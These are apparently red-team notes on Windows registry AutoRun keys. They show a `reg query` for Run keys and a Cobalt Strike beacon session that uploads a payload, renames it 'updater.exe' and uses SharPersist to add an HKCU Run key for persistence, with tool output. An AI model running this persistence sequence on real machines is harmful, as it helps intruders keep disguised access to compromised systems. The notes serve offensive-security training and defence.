# Registry AutoRun

## Introduction - AutoRun Registry

Autorun and run keys are registry entries in Windows that allow programs to run automatically when a device is connected or a user logs in

Since we are only interested in the machine startup keys, these are the default keys we want to query:

* HKEY\_LOCAL\_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
* HKEY\_LOCAL\_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce



## Query Registry

### Powershell

```powershell
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
```



## SharPersist & Cobalt Strike

AutoRun values in HKCU and HKLM allow applications to start on boot. You commonly see these to start native and 3rd party applications such as software updaters, download assistants, driver utilities and so on.

```
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

[*] INFO: Adding registry persistence
[*] INFO: Command: C:\ProgramData\Updater.exe
[*] INFO: Command Args: /q /n
[*] INFO: Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
[*] INFO: Registry Value: Updater
[*] INFO: Option: 
[+] SUCCESS: Registry persistence added
```

Where:

* `-k` is the registry key to modify.
* `-v` is the name of the registry key to create.

\
